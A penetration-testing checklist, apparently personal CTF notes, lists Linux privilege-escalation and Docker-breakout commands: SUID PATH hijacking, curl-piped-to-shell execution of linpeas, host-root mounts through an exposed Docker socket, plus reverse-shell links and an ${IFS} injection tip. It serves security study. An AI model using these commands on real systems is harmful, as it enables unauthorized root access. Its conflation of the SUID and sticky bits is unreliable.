## **General Checklist**

#### **General**
| | |
|--|--|
| https://book.hacktricks.xyz/pentesting-web/ | |
| https://www.revshells.com/ | *# insted of looking for payloads everytime use this to generate a reverse shell code* |
| cp /bin/bash ./bash; chmod +s ./bash and ./bash -p | *# copy the /bin/bash to the local dir and add sticky bit; mostly useful in cronjobs* |
| $DOMAIN.local | *# invalid TLD do people commonly use for their Active Directory Domain* |
| password guessing | |
| packet headers check| |
| check http headers| |
| env | *# check environment variables* |
| lsb_release | *# check for OS/Kernel vulnerabilities* |
| nmap UDP scan | *# if nothing interesting is found on any ports and services - do a nmap UDP scan -sU* |
| cat /etc/apache2/sites-enabled/$*.conf | *# check these files if there are more folders in the /var/www/ dir. knida like a vhost* |


### **Enumeration**
#### **FTP**
| | |
|--|--|
| check for anonymous login from the nmap script scan| |
| use brutespray to brute force common usernames and passwords from the nmap.xml  | |


### **Priviledge Escalation**
#### **Linpeas**
| | |
|--|--|
| curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh | *# Runs the linpeas script* |
| curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh | *# Downloads the linpeas script to the local dir* |

#### **GTFOBins**
| | |
|--|--|
| https://gtfobins.github.io/gtfobins | |


#### **SUID bit file finder**
| | |
|--|--|
| ![SUID_BIT](/images/suid_bit.png) | |
| SUID bit| *# User executes the file with permissions of the file owner* |
| SGID Bit | *# User executes the file with the permission of the group owner. File created in directory gets the same group owner.* |
| Sticky Bit | *# No meaning. Users are prevented from deleting files from other users.* |

##### **SUID Exploitation**
| | |
|--|--|
|  find / -perm -u=s -type f 2>/dev/null | *# finds the files with the permission sticky bit and channels the errors to /dev/null* |
| /usr/bin/menu | *# lets say we found an executable with sticky bit in the paht /usr/bin/menu and it executes a bash command - ex: curl*|
| echo "/bin/sh" > curl | *# create a file with the same executable name in the /tmp or home dir of any user* |
| chmod 777 curl | *# give all permission to the file* |
| export PATH=/$cURRENT_FILE_PATH:$PATH | *# change the PATH variable by adding the current folder into the PATH variable* |
| /usr/bin/menu | *# run the file and make sure it triggers the executable* | 


#### **Cronjobs**
| | |
|--|--|
| cat /etc/cronjob | *# to check the default cronjob file for cronjobs* |

#### **Docker breakout**
| | |
|--|--|
| 1. Mounted Docker Socket Escape | |
| find / -name docker.sock 2>/dev/null | *# If somehow you find that the docker socket is mounted inside the docker container, you will be able to escape from it. This usually happen in docker containers that for some reason need to connect to docker daemon to perform actions. #It's usually in /run/docker.sock* |
| Exploitation | *# In this case you can use regular docker commands to communicate with the docker daemon* |
| docker images | *# inside the remote machine - list all docker images* |
| docker run -it -v /:/host/ $IMAGE_NAME chroot /host/ bash | *# Run the image mounting the host disk and chroot on it* |
| docker run -it --rm --pid=host --privileged $IMAGE_NAME bash | *# Get full access to the host via ns pid * |
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash | *# and nsenter cli* |
| docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host $IMAGE_NAME chroot /host/ bash | *# Get full privs in container without --privileged* |

#### **Misc**
| | |
|--|--|
| bash unquoted variable bruteforce | *# https://github.com/anordal/shellharden/blob/master/how_to_do_things_safely_in_bash.md?source=post_page-----933488bfbfff--------------------------------* |
| ${IFS} in payloads for web application param tampering | IFS - Internal Field Seperator, which is used in the case that whitespaces are not supported |



### **Reverse Shell**

| | |
|--|--|
| https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells | *# reverse shell one-liners* |
| https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html | *# List of privilege escalation techiniques for linux* |